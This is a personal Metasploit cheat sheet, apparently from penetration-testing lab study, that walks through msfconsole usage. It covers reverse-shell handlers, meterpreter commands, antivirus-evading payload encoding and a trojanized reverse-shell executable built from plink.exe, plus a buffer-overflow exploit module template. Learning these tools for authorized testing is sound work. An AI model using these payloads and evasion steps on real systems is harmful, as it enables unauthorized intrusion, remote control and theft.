## Metasploit Framework (MSF)

### User Interfaces & Setup

1. Make sure MSF is updated

   ```bash
   sudo apt update; sudo apt upgrade metasploit-framework
   ```
   
4. Start Metasploit

   ```bash
   msfconsole
   ```

### Quick Startup

To start Metasploit without the banner (Quick start)

```bash
msfconsole -q
```

You can also supply parameters to MSF from the CLI to quickly populate options:

```bash
msfconsole -x "use exploit/multi/handler; set RHOST 192.168.153.10; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.153; set LPORT 4444; exploit"
```

### Menu Basic Commands

```bash
# Help menu - shows various categories and options
show -h

# Activate a module & change prompt to show active module
use MODULE_PATH_NAME

# Exit out of the current context
previous

# Return to the main prompt
back

# Change default interface used for LHOST (doesn't work for me)
setg interface tun0
```

### Modules

#### Selecting Modules

From main prompt:

```bash
# Show all modules of a certain type (exploit, auxiliary, etc)
show TYPE

# Search for modules
search OPTIONS
# Options
-h		# Show help menu
cve:	# Choose a year of the exploit
platform:	# windows, linux, etc
type:	# Filter by module type (exploit, auxiliary, etc)
rank:	# average, good, excellent, etc
name:	# Filter by descriptive name
```

#### Module Commands

From a module sub-prompt:

```bash
# Show information about the loaded module
info

# Show module options
show options

# Set an option value for the current module
set OPTION_NAME OPTION_VALUE
# Remove an option value for the current module
unset OPTION_NAME

# Set an option globally across all modules
setg OPTION_NAME OPTION_VALUE
# Remove a global option value for all modules
unsetg OPTION_NAME

# When using an exploit, check if the target is vulnerable - requires target to show some banner or other data
check

# Run a module (after setting options)
# Modules can also be run in the background.  See the 'Job Management' section
run
	# OR
exploit

```

#### Filtering Results

You get a lot of results back for things like Payloads but you can grep the output like so:

```bash
# Ex: Use grep to only show payloads with meterpreter
grep meterpreter show payloads

# Ex: You can chain it too for multiple searches
grep reverse_tcp grep meterpreter show payloads
```

#### Advanced Options

These options provide advanced evasion and automation tools.  Automation is useful for handling meterpreter sessions that are unmonitored.

```bash
# Show advanced options
show advanced

# Encode all stages of an exploit to bypass AV
set EnableStageEncoding true
# Choose encoder
set StageEncoder x86/shikata_ga_nai

# Run a script automatically when a meterpreter session is established
set AutoRunScript windows/gather/enum_logged_on_users
```

#### Exploit Multi Handler

Netcat can be used as a rudimentary way of catching reverse shells but does not work for more advanced payloads and is not really an elegant way to operate.  The multi handler works for all single and multi-stage payloads.

```bash
use multi/handler
set LHOST 192.168.119.216
set LPORT 8000
# You must tell the multi-handler what kind of payload to expect
set payload windows/meterpreter/reverse_https
# Run as a background job
run -j
```

This will create a listener in Metasploit to catch reverse shells.

#### Adding New Modules

1. Download module .rb code

2. Create directory that mirrors the metasploit paths for the Metasploit module path in /root/.msf4 and copy module into it
   ```bash
   ex:
   searchsploit -m 50064
   sudo mkdir -p /root/.msf4/modules/exploits/multi/php/
   sudo cp 50064.rb /root/.msf4/modules/exploits/multi/php/
   ```

3. Start metasploit and force reload of modules
   ```bash
   sudo msfconsole
   # might also need this
   sudo updatedb
   # Reload modules
   reload_all
   ```

### Payloads

Once an exploit module is loaded, you need to set a payload rather than use the default one.  After selection the payload, you will need to set options for it as well.  

Note:  Payloads with a slash in their name are staged payloads, but the ones without them are non-staged.  Ex. `shell_reverse_tcp` is non-staged, but `shell/reverse_tcp` is staged

The `show options` command contains an `Exploit target` section which may have additional options, and may require the `set target` command to match the environment you're exploiting.  Ex. You may need to specify a return address for a BoF attack.

```bash
# Show payloads compatible with the currently selected module
show payloads

# Select a payload
set payload PAYLOAD_PATH
```

#### Meterpreter

Payload should be selected to match architecture of target

```bash
# Show a list all modules and commands for meterpreter
help

# Target System Info
sysinfo

# Current user
getuid

# Upload a file
# NOTE:  Escape backslashes by using a double-backslash 
upload /usr/share/windows-resources/binaries/nc.exe c:\\users\\offsec.client251

# Download a file
# NOTE:  Escape backslashes by using a double-backslash 
download c:\\windows\\system32\\calc.exe /tmp/calc.exe

# Remote Filesystem navigation
ls \ pwd \ cd

# Local Filesystem navigation
lls \ lpwd \ lcd

# Launch a command shell
shell
# You won't get a prompt, so just try to enter a command once it says the channel was created.
# If the shell gets hung, use CTRL+C to close the channel and return to meterpreter

# Launch an application
execute -f app.exe

# List all running processes
ps

# Terminate a process ID N
kill N
```

#### Transports

Allows you to switch protocols after the initial compromise.

From a meterpreter session:

1. View existing transports

   ```bash
   # Show currently active methods
   transport list
   ```

2. Add a new transport:

   ```bash
   # Add a new transport method
   # Remember to setup a appropriate listener to handle the connection
   transport add -t reverse_tcp -l 192.168.119.216 -p 8001
   	# Options
       -t	# Transport type
       -l	# Local host to connect to
       -p	# Local port to connect to
   ```

3. Background the current meterpreter prompt and start a new one to handle the new transport options, and background it.

4. The transport should automatically make a connection.  At this point, you can switch to whichever session you would like or from within a meterpreter session you can switch transport with:

   ```bash
   transport next
   ```

#### Creating Portable Executable Payloads

Payloads can be created from within Metasploit much like with MSFVenom.

1. Selection a payload to use
2. Set the parameters for the payload
3. Issue the `generate` command, using the same options that would be used with MSFVenom

```bash
# Example
use payload/windows/shell_reverse_tcp
LHOST=192.168.119.216
LPORT=8000
generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse.exe

# Notice that 'msfvenom -p windows/shell_reverse_tcp' are not used since we've already selected the payload.
```

### Job Management

Exploits and handlers can be run as background jobs rather than taking over the current session.  

```bash
# Run a module as a background job
run -j
	# OR
exploit -j

# View current jobs
jobs

# View info on job ID N
jobs -i N
```

### Session Management

Once a remote session is established, it can be managed with the following.  These commands are performed from the module menu:

```bash
# Show all sessions
sessions -l

# Interact with session N
sessions -i N
```

These commands are performed from within the meterpreter session:

```bash
# Background the session
background
	#OR
CTRL+Z

# Kill the session
exit
	#OR
CTRL+C
```

### Local Metasploit Database

With PostGRESQL running, Metasploit will record its findings for convenient access in the Database.

#### Setup

1. Start and enable postgresql database (if using )

   ```bash
   sudo systemctl start postgresql
   sudo systemctl enable postgresql
   ```

2. Create & initialize the MSF database

   ```bash
   sudo msfdb init
   ```

3. Check the status
   ```bash
   sudo msfdb status
   ```

#### Workspaces

Start the database viewer
```bash
sudo msfdb run
```

Create a workspace (basically a folder for a project) and select it
```bash
workspace -a MySpace
workspace MySpace
```

Delete a Workspace
```bash
workspace -d MySpace
```

Help
```bash
workspace -h
```

Export database

```bash
# Example
db_export -f xml backup.xml

# Help menu
db_export -h
```

#### Gathered info

Check hosts in database

```bash
hosts -h
```

Services

```bash
services -h
```

Credentials

```bash
creds -h
```

Loot - This shows an overall list of gathered info

```bash
loot -h
```



#### Nmap Integration

Import nmap scan (should use XML format from nmap)

```bash
db_import scan.xml
```

Scan direct from Database

```bash
db_nmap -sV -sS 10.10.10.8
```



#### Reinitialize the Databse

In case of an error or desire to reset the DB (or lost password) you can reset the database with:
```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```



#### Viewing Results

```bash
# Show results of Scans
services
# Options
-h	# Show help menu
-p	# Filter by port
-s	# Filter by service name

# Show Discovered Hosts
hosts

# Show discovered credentials
creds
```

#### Module Integration

You can load data from the database into the options of modules:

Example:

```bash
# Load a module
use scanner/smb/smb2

# Search for and load compatible hosts into specified option
services -p 445 --rhosts
-p 445	# Searches for hosts that had port 445 open
--rhosts	# Saves results into the rhosts option of the loaded module
```

#### Workspaces

Allows you to separate results into different areas to better organize the data

```bash
# Show available workspaces
workspace

# Add a workspace
workspace -a NAME

# Delete a workspace
workspace -d NAME

# To change to a workspace
workspace NAME
```

#### DB nmap Wrapper

Use this to run nmap from within MSF and store the results in the database.

It uses the same syntax as nmap with a few additional options for MSF

```bash
db_nmap [NMAP OPTIONS]
```

### Building a MSF Module

1. Create a user defined MSF directory under the root user's home directory

   ```bash
   sudo mkdir -p /root/.msf4/modules/exploits/windows/http
   ```

2. Copy another module file to use as a template to this directory

   ```bash
   sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http
   ```

3. Open the copied file and update the following:

   - 'Name'

   - 'Description'

   - 'Author'

   - 'References' <-- This was just a pointed to the number for the exploit entry in EDB

   - 'DefaultOptions' <-- Verify these settings are correct

   - 'Payload' <-- Verify these settings are correct

   - 'Targets'  <--- Make sure the vulnerable versions are listed

   - 'def check'  <--- Modify this section to point to the correct page and modify the check function to search for the correct header information to match the version

     ```bash
     # Ex for SyncBreeze 10.0.28
     if res && res.code == 200 
       product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
       if product_name =~ /10.\.0\.28/
     	return Exploit::CheckCode::Appears
       end
     end
     ```

   - 'def exploit'  <--- This section is the actual exploit code

     ```bash
     # Example
     def exploit
         print_status("Generating exploit...")
         exp = rand_text_alpha(target['Offset'])	# Offset padding
         exp << [target.ret].pack('V')	# EIP
         exp << rand_text(4)		# Space between EIP and Code
         exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
         exp << payload.encoded
         print_status("Sending exploit...")
         send_request_cgi(
             'uri' => '/login',			# URL for login
             'method' => 'POST',			# Uses HTTP post
             'connection' => 'keep-alive',
             'vars_post' => {
                 'username' => "#{exp}", # Sends BoF string
                 'password' => "fakepsw"
                 }
         )
         handler
         disconnect
     end
     ```
   
4. Note: when running scripts from the root directory, you must start msfconsole as root as well to access them.

### MSF Automation

Resource Scripts allow you to put MSF commands in a file and run it as a script, allowing repetitive tasks to be simplified (such as setting up handlers)

```bash
# Example setup.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.119.216
set LPORT 8000
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
# ExitOnSession tells the listener whether it should stop listening or not once a connection is made.  False means it keeps on listening
set ExitOnSession false
exploit -j -z	# -z tells it not to interact with the session after successful exploitation
```

To run the script file:

```bash
sudo msfconsole -r setup.rc
```

### Plugins

Plugins are found in `/usr/share/metasploit-framework/plugins` and new ones can be added there

Plugins are loaded with
```bash
load PLUGIN_NAME
```

Installing new plugins just requires moving them to the default folder.
